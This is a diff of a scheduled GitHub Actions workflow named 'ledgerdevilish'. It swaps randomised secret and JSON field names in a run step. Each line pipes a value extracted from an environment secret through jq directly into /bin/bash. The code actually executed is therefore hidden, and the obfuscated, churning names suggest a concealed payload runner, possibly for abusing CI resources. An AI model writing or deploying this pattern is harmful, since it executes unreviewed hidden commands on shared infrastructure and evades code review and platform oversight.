@@ -2,8 +2,8 @@ name: ledgerdevilish
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 0/6 * * *'
-jobs:  # 22220
+    - cron: '44 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,15 +11,14 @@ jobs:  # 22220
       - uses: actions/checkout@v4
       - name: ledgerdevilish
         env:
-          jqo551: ${{ secrets.jqo551 }}
+          jhxp61: ${{ secrets.jhxp61 }}
         run: |
-          echo $jqo551 | jq -r .smp0147 | /bin/bash
-          echo $lzee038 | jq -r .non79875 | /bin/bash
-          echo $eu634 | jq -r .zgh16 | /bin/bash
-          echo $ripz9 | jq -r .xohvt4 | /bin/bash
-          echo $az134 | jq -r .oohw197 | /bin/bash
-          echo $hwjzc7239 | jq -r .jrk99329 | /bin/bash
-          echo $jm49027 | jq -r .bgi73 | /bin/bash
-          echo $mgf4 | jq -r .z374 | /bin/bash
-          echo $br882 | jq -r .w2936 | /bin/bash
+          echo $jhxp61 | jq -r .pit1656 | /bin/bash
+          echo $abw6 | jq -r .tmym32 | /bin/bash
+          echo $dws0 | jq -r .kold80658 | /bin/bash
+          echo $ydn1 | jq -r .iv5330 | /bin/bash
+          echo $kbk207 | jq -r .d853 | /bin/bash
+          echo $qmoqf7 | jq -r .eq89250 | /bin/bash
+          echo $koo7351 | jq -r .hpmrl1705 | /bin/bash
+          echo $pkcht4 | jq -r .cugn3 | /bin/bash
 
